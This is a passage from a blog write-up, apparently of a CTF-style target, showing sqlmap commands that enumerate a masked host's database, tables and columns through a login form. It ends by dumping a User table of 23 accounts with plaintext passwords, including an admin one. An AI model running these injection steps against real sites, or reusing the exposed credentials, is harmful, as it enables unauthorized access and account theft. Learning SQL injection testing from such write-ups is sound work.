</span></span><span class=line><span class=cl>database management system users <span class=o>[</span>1<span class=o>]</span>:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;my&#39;</span>@<span class=s1>&#39;localhost&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>21:12:56<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> unable to retrieve the number of password hashes <span class=k>for</span> user <span class=s1>&#39;my&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>21:12:56<span class=o>]</span> <span class=o>[</span>ERROR<span class=o>]</span> unable to retrieve the password hashes <span class=k>for</span> the database users
</span></span><span class=line><span class=cl><span class=o>[</span>21:13:03<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: USAGE
</span></span><span class=line><span class=cl>database management system users privileges:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> %my% <span class=o>[</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1<span class=o>]</span>:
</span></span><span class=line><span class=cl>    privilege: USAGE
</span></span></code></pre></div><h5 id=4314-identifying-tables>4.3.1.4 Identifying Tables</h5><p>I used <code>-D</code> to specify a database and used <code>--tables</code> to retrieve the table names from the database. Using <code>--dump</code> would allow me to dump this information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span> --dump -D cloud  --threads <span class=m>10</span> --tables
</span></span></code></pre></div><p>After some time, I obtained all the tables in that database.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Database: cloud
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>34</span> tables<span class=o>]</span>
</span></span><span class=line><span class=cl>+----------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Cmp                  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Cmp_model            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Cmp_novnc            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Ocmp                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Pcmp                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Score                <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Team                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> TeamJoin             <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> User                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> user                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> business             <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> business_list        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> course_table         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> course_table2        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ctf_num_table        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ctf_num_table1       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> device_list          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> device_table         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> instance_table       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> mapping_table        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> mapping_table2       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> network_table        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> network_table1       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> num_table            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> progress_table2      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> scene_describe_table <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> scene_num_table      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> scene_state_table    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> scene_table          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> score_table2         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> student_list         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> system_log           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> user_log             <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> work_table2          <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------------------+
</span></span></code></pre></div><h5 id=4315-identifying-columns>4.3.1.5 Identifying Columns</h5><p>I used <code>-T</code> to specify a table and used <code>--columns</code> to retrieve the column names in the database.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span> -D cloud -T User --columns
</span></span></code></pre></div><p>SQLMap retrieved the column names and their corresponding data types.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>20:27:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: U_ID
</span></span><span class=line><span class=cl><span class=o>[</span>20:27:58<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>20:28:41<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: U_PASS
</span></span><span class=line><span class=cl><span class=o>[</span>20:29:05<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>20:29:48<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: U_ROLE
</span></span><span class=line><span class=cl><span class=o>[</span>20:30:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>
</span></span><span class=line><span class=cl>Database: cloud
</span></span><span class=line><span class=cl>Table: User
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>3</span> columns<span class=o>]</span>
</span></span><span class=line><span class=cl>+--------+--------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Column <span class=p>|</span> Type         <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------+--------------+
</span></span><span class=line><span class=cl><span class=p>|</span> U_ID   <span class=p>|</span> varchar<span class=o>(</span>255<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> U_PASS <span class=p>|</span> varchar<span class=o>(</span>255<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> U_ROLE <span class=p>|</span> varchar<span class=o>(</span>255<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------+--------------+
</span></span></code></pre></div><h5 id=4316-retrieving-everything>4.3.1.6 Retrieving Everything</h5><p>We can use <code>-D</code> and <code>-T</code> to retrieve all the data from a specific table. If you don&rsquo;t add <code>--dump</code>, it will print the contents of the table directly.</p><p>If you find the time-based SQL injection to be too slow, you can use <code>--threads</code> to enable multi-threading. For example: <code>--threads 10</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -u http://***.***.**.**:11080/ctf/login1.php --method POST --data<span class=o>=</span><span class=s2>&#34;name=a&amp;nuse=12345&amp;role=2&#34;</span> --dump -D cloud -T User
</span></span></code></pre></div><p>This command will dump the data from the &ldquo;User&rdquo; table:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Database: cloud
</span></span><span class=line><span class=cl>Table: User
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>23</span> entries<span class=o>]</span>
</span></span><span class=line><span class=cl>+-----------+----------------------+--------+
</span></span><span class=line><span class=cl><span class=p>|</span> U_ID      <span class=p>|</span> U_PASS               <span class=p>|</span> U_ROLE <span class=p>|</span>
</span></span><span class=line><span class=cl>+-----------+----------------------+--------+
</span></span><span class=line><span class=cl><span class=p>|</span> admin     <span class=p>|</span> voxjac-4xudwe-Rydpes <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> chrome    <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> chrome2   <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ie        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> microsoft <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o1        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o10       <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o11       <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o12       <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o2        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o3        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o4        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o5        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o6        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o7        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o8        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> o9        <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> opera     <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> opera2    <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> opera3    <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>2</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> wxx       <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>3</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> wxx1      <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>3</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> wxxxx     <span class=p>|</span> <span class=m>1234</span>                 <span class=p>|</span> <span class=m>3</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl>+-----------+----------------------+--------+
</span></span><span class=line><span class=cl><span class=o>[</span>20:45:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> table <span class=s1>&#39;cloud.`User`&#39;</span> dumped to CSV file <span class=s1>&#39;/home/kali/.local/share/sqlmap/output/***.***.**.**/dump/cloud/User.csv&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>20:45:33<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/kali/.local/share/sqlmap/output/***.***.**.**&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 20:45:33 /2023-10-16/
</span></span></code></pre></div><p><strong>END:</strong> It is no doubt that we can log in with these accounts. In fact, it turns out that there isn&rsquo;t much valuable information on this website. So the whole story is just to demonstrate its poor design and practice using SQLMap. :)</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-10-20</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/cybersecurity/>cybersecurity</a>,&nbsp;<a href=/tags/sqli/>SQLi</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/cve-2023-2317/ class=prev rel=prev title=CVE-2023-2317><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>CVE-2023-2317</a>
<a href=/posts/everything-about-https/ class=next rel=next title="Everything about HTTPS">Everything about HTTPS<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=www.debidong.github.io target=_blank>debidong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>